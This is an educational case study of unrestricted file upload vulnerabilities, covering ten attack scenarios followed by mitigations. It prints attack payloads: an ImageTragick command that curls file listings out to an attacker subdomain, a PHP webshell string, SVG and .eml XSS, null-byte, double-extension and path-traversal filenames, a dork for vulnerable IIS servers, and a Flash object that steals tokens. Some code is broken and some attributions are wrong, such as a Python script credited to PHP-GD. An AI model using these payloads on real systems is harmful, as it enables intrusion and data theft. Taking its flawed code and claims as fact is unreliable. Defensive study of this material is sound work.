# Case study on Unrestricted File Upload Vulnerability

## In this paper, we will be case studying one of the OWASP Top 10 vulnerabilities i.e. Unrestricted File Upload Vulnerability. To sum up, this vulnerability can lead to CSRF, SSRF, XSS even DOS attack etc. Let's get a detailed overview of 10 scenarios that I have handpicked. And at the end the mitigation techniques that can help the developer to if not totally remove but evade the unrestricted file upload vulnerability up to a vast extent.

## *Attack scenarios*

### MIME checking flaws

When a file is uploaded on any server by user interface, there are several things like Filename, File type, File Identifier, File content and File size that are to be checked, the payloads can be embedded in the file name, even the file headers that can be edited by using simple he editors like Bliss Hex Editor. The file identifier can be fooled by embedding wrong file signatures that can make the code think that the uploaded file is a jpg but the MIME can be crafted to carry the payload. Even images can be of varable sized, sometimes they can be even crafted to be of GBs that can lead to DOS attack.

### Blacklisting 
Taking a scenario where the developer validates that the uploaded file doesn't have or contain certain etension via blacklisting technique
```php
foreach ($file as $file) 
{
	if(preg_match('^.*\.(php|php1|php2|php3|php4|php5|php6|php7|phtml|exe)$'), $file)
	echo "Bad file format";
	header("Location: https://192.168.45.12/shell.php")
}
```
The above code is actually blacklisting the given file formats but it is not checking the case sensitiviy of the files, that can lead to again bypass of the above code.

### The .eml files

Look at this snippet
```
TEST
Content-Type: text/html

Content-Transfer-Encoding: quoted-printable

Hello
=3Cscript=3Econfirm(=2FXSS=2F)=3C=2Fscript=3E
```
In the case discussed above this one, all the suspected filename extensions were blacklisted but then email that are sent out via ThunderBird carry .eml extension that are not usually sanitised by the developers because of literally very less use of ThunderBird mail service. Though this vulnerability can only be executed in Internet Explorer and an stored **XSS** can be trigerred

### Validating Filename only

Look at the code snippet below"
```php
$except = array('rar','zip','mp3','mp4','png','gif','jpg','bmp','avi');
$imp = implode('|', $except);

foreach ($file as $file) 
{
	if (preg_match('/^.*\.('.$imp.')',$file))
		echo $file;
}
```

In this bug, not to mention but that is actually a carelessness of the developer. Here in this validation method, the developer is making sure that the extension must match with the string elements in the array but he is nt making checking if the file ends with same extension or not. So suppose if any specially crafted file called **shell.jpg.php**, the file will bypass the File Validation. Thus gaining a shell

### Null Byte Injection

The null character is a control character with the value of zero. PHP treats the null byte **%00** as a terminator. In that case, naming your file like **shell.php%00.jpg or **shell.pnp\x00.jpg** which is in haxadecimal value, will satisfy the file upload validation becuase the terminator will make the php extension kinda invisible. Invisible as in that the null byte terminator hides the php extension and the file will be treated as a **jpg** file and hence evading the file validation code.

### SVG manipulation

Look at the code snippet below

```xml
<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="https://www.w3.org/2000/svg" onload="alert('XSS')">
	<script type="text/javascript">![CDATA[//more JS here]]</script>

	<circle	cx="50" cy="50" r="50" fill="green" />
<svg>
``` 

SVG images are actually XML data, and mostly the SVG images are allowed to be uploaded. The XML data can prove to be chaotic if crafted maliciously inside a SVG like in the above snippet, the above SVG when loaded as an entitiy in a Web Application can trigger a Cross Site Scripting  vulnerability. The question arises why developers allow SVG, the answer is simple that developer look for the ways to get the usability for their customers, not the vulnerablity. This is where hackers are one step ahead.

### Can video uploads cause much harm?

A big yes, even YouTube, VK and Facebook were vulnerable to this attack, in this attack scenario, attackers make use of the SSRF vulnerability in **ffmpeg library** which is in the older version still not fixed and due to less number of bug in the older version, above 700+ websites still use the vulnerable release of **ffmpeg**. Using this vulnerability,the attackers were able to read the files on the server, even the **etc/passwd** on YouTube was left vulnerable

### Directory Traversal

Look at the following code below:
```php
<?php

print_r($_FILES);

if (!empty($_FILES['pictures']))
{
    // Modified slightly from http://php.net/manual/en/function.move-uploaded-file.php
    $uploads_dir = '.';
    foreach ($_FILES["pictures"]["error"] as $key => $error) {
        if ($error == UPLOAD_ERR_OK) {
            $tmp_name = $_FILES["pictures"]["tmp_name"][$key];
            $name = $_FILES["pictures"]["name"][$key];
            echo "move_uploaded_file($tmp_name, \"$uploads_dir/$name\");";
        }
    }
}
?>
<form action="" method="POST" enctype="multipart/form-data" >
<input type="hidden" name="MAX_FILE_SIZE" value="10000000">
<input type="file" name="pictures[[type]">
<input type="file" name="pictures[[name]">
<input type="file" name="pictures[name][">
<input type="submit" value="submit">
</form>
```

In this attack scenario we are going to discuss further on, let's see what the code above does? This is actually a code snippet from the 2011 code archive of ShutterStock in which we were allowed to strictly upload **only** jpg file extensions. Null byte termination didn't work either way but the if the file was renamed as **../../../../header.jpg** so basically what we'll be doing is uploading this jpg file directly into the parent directories and then it replaced the **header.jpg** of the website


### The PHP-GD validation

Look at the code snippet below:

```python
src = sys.argv[1]
dest = sys.argv[2]
match_len = 26;
onlyfiles = [f for f in listdir(src) if isfile(join(src,f))]

for File in onlyfiles:
	found_flag = True
	hex_parts = dict()
	hex_parts2 = dict()
	f1 = open(join(src,File),'rb')
	data1 = binascii.hexlify(f1.read())
	parts = [data1[i:i+match_len]for i in range(0, len(data1),match_len)]
	for part in parts:
		hex_parts[part] = 1
	f1.close()
	f2 = open(join(dest,File),'rb')
	data2 = binascii.hexlify(f2.read())
	parts = [data2[i:i+match_len]for i in range(0, len(data1),match_len)]
	for part in parts:
		hex_parts2[part] = 1
	f2.close()
```

This code is from the PHP-GD library which validates if the image file contains any metadata or not and if it does, the PHP-GD creates another image and stores it as a fresh image without any metadata but just the file headers and basic info. And as the metadata is cleared, a metadata is actually saved in the **jpg** file which tells the PHP-GD library that the image has been already passed through the code. So using the same code, the attacker passes an image file and crafts the output image file which is made by the code and then crafts it such that the identical bytes of the orignal images match with the identical bytes of the generated image which at the end fools the code and payloads like ```<?system($GET['X']);?>)``` can be injected in the hex of the generated image. Hence gaining the shell.
This situation is more like
## I used the stones to destroy the stones
The vulnerability was firstly found on a website called BookFresh and the POC can be read [here](https://secgeek.net/bookfresh-vulnerability)

### Image Tragic Attack

Once again the SVG image were used and the XML data is crafted such that it includes the malicious payload. Here is an example of the payload

## Payload:
```
push graphic-content
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl"https://$i.atacker.tld/" -d @- > /dev/null; done`'
pop image-context
```
## Result:
```
NAME: home.attacker.tld, Type: A
NAME: boot.attacker.tld, Type: 28
NAME: type.attacker.tld, Type: 28
NAME: bin.attacker.tld, Type: A
...
```

## 'id' shell command returns:
```
NAME: uid=99(nobody).attacker.tld., Type: 28
NAME: groups=99(nobody).attacker.tld., Type: A
NAME: gid=99(nobody).attacker.tld., Type: A
``` 

Actually what the payload is doing is that it is giving the ```ls``` command in the ```/``` root directory and then sending the output at his subdomain and the DNS query is sent to the attacker's server, as the maximum size of the subdomain that the payload can handle is 64 bytes so the subdomain the attacker has crafted in the payload is in the hexadecimal value and all the requests that the server is sending is 64 bytes per request. 
This vulnerability was also noticed by Facebook SRT and the Proof Of Concept can be read at this [link](http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html). The vulnerabilitiy is still reproducable as the older versions of ImageMagick library are yet still vulnerable to SSRF and RCE. 


### Exploiting old IIS servers

Microsoft IIS in it's older versions < 7.0 had an issue with handling the file uploads. An attacker can actualy rename the file such that it looks like a ```jpg``` to the file upload functionality but it executes only the files before the terminator i.e. the semicolon ```(;)``` for example if the file uploaded is crafted like ```something.aspx;file.jpg```, the file gets validated but the terminator executes only ```something.aspx```. The Google dork below was used to find the vulnerable server:
```
intitle:"index of" intext:".aspx;1.jpg"
```
Even though this vulnerability is quite old and most of the companies don' use such old IIS versions, but still from the persective of an attacker, this vulnerablility still exists.

### Cross Domain Data Highjacking

Basically we are going to discuss about the vulnerability where the code is validating uploaded filename, content-type but not the file content. Attackers can craft a Flash file and disguise it as a ```.jpg``` file. The paylad then calls the flash file with the ```<object>``` tags in the website and hence the attacker is able to send a Cross Domain Request to steal the CSRF Tokes that cn lead to leakage of sensitive data. This playload is triggered because plugins like Flash doesn't care about the extension or content-type. When the payload is injected inside the ```<object>``` tags, it will be executed as a Flash file as long as the content looks like Flash, here's an example:

```
<object style="height:1px;width:1px"data="https://victim.com/user/3456/profilepicture.jpg"type="application/x-shockwave-flash" allowscriptaccess="always"flashvars="c=read&u=http://victim.com/secret_file.txt"></object>
```
The detailed write-up can be found [here](github.com/nccgroup/CrossSiteContentHighjacking)

## *Mitigation*

1. Make all the files downloadable but not executable also known as Content Deposition
2. Validate the file size 
3. Rename the filenames, strip the extension and rename the file along with appending the allowed file extensions
4. Always use a sandbox to store uploaded files.
5. Use MD5 checksum to compare and store the filenames and return to user only the MD5 checksum when requested.
6. Use CSRF protection 
7. The content should be saved in a database rather than a filesystem.
8. Ensure that files are not accessible by unauthorised users.
9. Ensure that the files with double extensions like ```file.php.jpg``` are not accepted and marked as invalid file formats by the file upload validation mechanism.
10. NEVER TRUST THE USER. Always strip every byte of data uploaded by the user and match the data with the signatures of the most often used payloads and malwares.

# Wrapping up

Contact the author on [Twitter](https://twitter.com/0xskr1p7)


